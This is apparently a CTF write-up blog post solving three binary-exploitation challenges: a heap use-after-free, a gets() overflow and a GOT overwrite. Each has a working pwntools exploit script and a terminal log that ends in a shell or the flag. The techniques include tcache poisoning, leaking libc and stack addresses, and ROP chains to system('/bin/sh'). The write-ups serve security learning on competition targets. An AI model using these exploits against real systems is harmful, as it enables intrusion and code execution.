+++
date = '2026-02-12T19:27:05+01:00'
draft = false
title = '0xFUN_02_26'
+++


<br>

## PWN

<!-------------------------------------------------------------------------------------->
### 67
#### attachments

<a href="/ctf/0xfun_02_26/67/chall">chall</a>
<a href="/ctf/0xfun_02_26/67/chall_patched">chall_patched</a>
<a href="/ctf/0xfun_02_26/67/ld-linux-x86-64.so.2">ld-linux-x86-64.so.2</a>
<a href="/ctf/0xfun_02_26/67/libc.so.6">libc.so.6</a>
<a href="/ctf/0xfun_02_26/67/solve.py">solve.py</a>

#### reverse
Classical heap challenge<br>
vuln is obvious it's a use after free<br>
no double free but we can reuse free chunks to edit them or print them<br>
Allocated chunks are stored by index in tab but we can alloc in tab[n] even if this tab entry is already allocated which ease the heap managment<br><br>
The libc is reall recent so 
<ol>
<li>No house of water to gain easy unsorted bin leak</li>
<li>No malloc/free_hook</li>
<li>Heap pointers are mangled</li>
</ol>

So 2 possiblities
<ol>
    <li><br>
        <ol>
        <li>leak heap</li>
        <li>leak libc</li>
        <li>FSOP with one gadget</li>
        </ol>
    </li>
    <li><br>
        <ol>
        <li>leak heap</li>
        <li>leak libc</li>
        <li>leak stack</li>
        <li>leak canary</li>
        <li>ROPchain with pop_rdi+binsh+system</li>
        </ol>
    </li>
</ol>

As i'm not really competent in FSOP for the moment and as the heap is very easy to manage,<br>
ROPchain seems to be the easiest way.

#### solve

```python

io = remote("chall.0xfun.org", 49332)


def create(i, s, d):
    sla(b"Exit", b"1")
    sla(b"Index", i)
    sla(b"Size", s)
    sla(b"Data", d)

def delete(i):
    sla(b"Exit", b"2")
    sla(b"Index", i)

def read(i):
    sla(b"Exit", b"3")
    sla(b"Index", i)

def edit(i, d):
    sla(b"Exit", b"4")
    sla(b"Index", i)
    sla(b"Data", d)


'''
1)
This pattern always give us a reliable leak heap
And an arbitrar placed new chunk
So i use this for every step 
each step by usign a different size
for different tcache
'''

'''
2)
Creation of two fake chunks of size
0x431 in order to free them to gain libc leak
'''

create(b"0", b"6", b"a")
create(b"1", b"16", b"a")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
print("first heap leak : ", real_heap)

new_heap = (real_heap + 0x10) ^ leak_mangle
create(b"2", b"32", b"A")
edit(b"0", p64(new_heap)[:-2])
create(b"0", b"16", b"a")
create(b"0", b"16", p64(0) + p64(0x431))

''' must allign the fakes chunks for the free running without errors'''
for i in range(14):
    create(b"0", b"48", b"A")

create(b"0", b"48", b"A")
create(b"1", b"48", b"A")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle

new_heap = (real_heap - 0x10) ^ leak_mangle
create(b"3", b"32", b"A")
edit(b"0", p64(new_heap))
create(b"0", b"48", b"a")
create(b"0", b"48", p64(0) + p64(0x431))

''' must allign the wilderness for the free running without errors'''
for i in range(12):
    print(i)
    create(b"0", b"64", b"A")

delete(b"2")
read(b"2")
rcu(b"Data: ")
leak_libc = l64(rcv(6))
print("libc leak : ", hex(leak_libc))

libc_base = leak_libc - (0x7ffff7fb1b20 - 0x00007ffff7dc7000)
binsh     = libc_base + (0x7ffff7f79ea4 - 0x00007ffff7dc7000)
syst      = libc_base + (0x7ffff7e1dac0 - 0x00007ffff7dc7000)
stdin     = libc_base + (0x7ffff7fb18e0 -  0x00007ffff7dc7000)
stdout    = libc_base + (0x7ffff7fb25c0 -  0x00007ffff7dc7000)
stder     = libc_base + (0x7ffff7fb24e0 -  0x00007ffff7dc7000)
''' pas de hook tfacon ... '''
mall_hook = libc_base + (0x7ffff7fb81c0 -  0x00007ffff7dc7000)
free_hook = libc_base + (0x7ffff7fb81c8 -  0x00007ffff7dc7000)
og1 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0xe5ff0
og2 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x10472a
og3 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x104732
og4 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x104737
pop_rdi = libc_base + (0x7f729daf3dea - 0x00007f729d9ee000)

'''
3)
There is a stack pointer on the libc, just behind
the stdout file structure
So let's leak it 
'''

create(b"0", str(0x100).encode(), b"A")
create(b"1", str(0x100).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle

new_heap = (stdout + 0x110) ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x100).encode(), b"a")
create(b"1", str(0x100).encode(), b"a")
read(b"1")
rcu(b"Data: a\n" + b"\x00"*14)
leak_stack = l64(rcv(6))
print("leak stack : ", hex(leak_stack))


'''
4)
Now we can create a chunk on stack
Let's leak the canary
I see after that is was useless
but it's made so...
'''
create(b"0", str(0x60).encode(), b"A")
create(b"1", str(0x60).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
main_base_stack_frame = leak_stack - (0x7ffd556b26f8 - 0x7ffd556b2650)
new_heap = main_base_stack_frame ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x60).encode(), b"b")
create(b"1", str(0x60).encode(), b"c")
read(b"1")
rcu(b"Data: c\n" + b"\x00"*14)
rcv(8)
canary = l64(rcv(8))
print("leak canary : ", hex(canary))

'''
5)
And finnally write our ROPchain under the 
'create_note' stack frame
because the program exit and never go out 
of the main stack frame
'''

create(b"0", str(0x70).encode(), b"A")
create(b"1", str(0x70).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
create_note_base_stack_frame = leak_stack - (0x7ffca5aa9618 - 0x7ffca5aa94d0)
new_heap = create_note_base_stack_frame ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x70).encode(), b"b")
create(b"1", str(0x70).encode(), b"c"*8 + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(syst))


io.interactive()



```

```bash
┌──(pwn_env)─(sk4r㉿kali)-[~/…/CTF/0xFUN/pwn_67]
└─$ /home/sk4r/pwn_env/bin/python /home/sk4r/CTF/0xFUN/pwn_67/solve.py
[+] Opening connection to chall.0xfun.org on port 49332: Done
first heap leak :  103098774483760
libc leak :  0x7947481e4b20
leak stack :  0x7ffd9ea857a8
leak canary :  0x6097eecd54c87100
[*] Switching to interactive mode
: Note created!
$ ls
chall
flag.txt
$ cat flag.txt
FLAG{REDACTED}
```
<!-------------------------------------------------------------------------------------->

### fridge
#### attachments

<a href="/ctf/0xfun_02_26/fridge/vuln">vuln</a>
<a href="/ctf/0xfun_02_26/fridge/vuln_patched">vuln_patched</a>
<a href="/ctf/0xfun_02_26/fridge/solve.py">solve.py</a>

#### reverse

There is a big overflow in the function 'set_welcome_message':

```C
void set_welcome_message(void)

{
  char local_30 [32];
  FILE *local_10;
  
  puts("New welcome message (up to 32 chars):");
  gets(local_30);
  ...
}
```
And the binary hasn't canary and is not PIE (in 32 bits)<br>
system is in the plt, <br>
and the is the string '/bin/sh\x00' on a code dependant address<br>
So let's do a minimal 32 bit ROPchain.

#### solve

```python
io = remote("chall.0xfun.org",  4163)

binsh = 0x0804a09a
syst  = 0x080490a0

pl = b"a"*48
pl += p32(syst)
pl += p32(binsh)
pl += p32(binsh)

sla(b"Exit", b"2")
sla(b"up to 32", pl)


io.interactive()
```

```bash
┌──(pwn_env)─(sk4r㉿kali)-[~/…/CTF/0xFUN/pwn_fridge]
└─$ /home/sk4r/pwn_env/bin/python /home/sk4r/CTF/0xFUN/pwn_fridge/solve.py
[+] Opening connection to chall.0xfun.org on port 4163: Done
[*] Switching to interactive mode
 chars):
$ ls
config.txt  flag.txt  food_dir  vuln
$ cat flag.txt
FLAG{REDACTED}
```

<!-------------------------------------------------------------------------------------->

### what_you_have
#### attachments

<a href="/ctf/0xfun_02_26/what_you_have/chall">chall</a>
<a href="/ctf/0xfun_02_26/what_you_have/chall_patched">chall_patched</a>
<a href="/ctf/0xfun_02_26/what_you_have/solve.py">solve.py</a>

#### reverse
<ol>
<li>not PIE</li>
<li>not RELRO</li>
<li>there is a win function</li>
<li>explicitly write what we want where we want</li>
</ol>

```C
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined8 *local_20;
  undefined8 local_18;
  ...
  puts("Show me what you GOT!");
  __isoc99_scanf(&DAT_0040206b,&local_20);
  puts("Show me what you GOT! I want to see what you GOT!");
  __isoc99_scanf(&DAT_0040206b,&local_18);
  *local_20 = local_18;
  puts("Goodbye!");
...
}
```

So let's override the puts@got entry by the win function.

#### solve

```python
io = remote("chall.0xfun.org", 25590)

win = 0x401236
puts = 0x403430

sla(b"GOT", str(puts).encode())
sla(b"GOT", str(win).encode())
```

```bash
┌──(pwn_env)─(sk4r㉿kali)-[~/…/CTF/0xFUN/pwn_what_you_have]
└─$ /home/sk4r/pwn_env/bin/python /home/sk4r/CTF/0xFUN/pwn_what_you_have/solve.py
[+] Opening connection to chall.0xfun.org on port 25590: Done
[*] Switching to interactive mode
! I want to see what you GOT!
I like what you GOT! Take this: FLAG{REDACTED}
```

Thx. 
<br>
Sk4r.
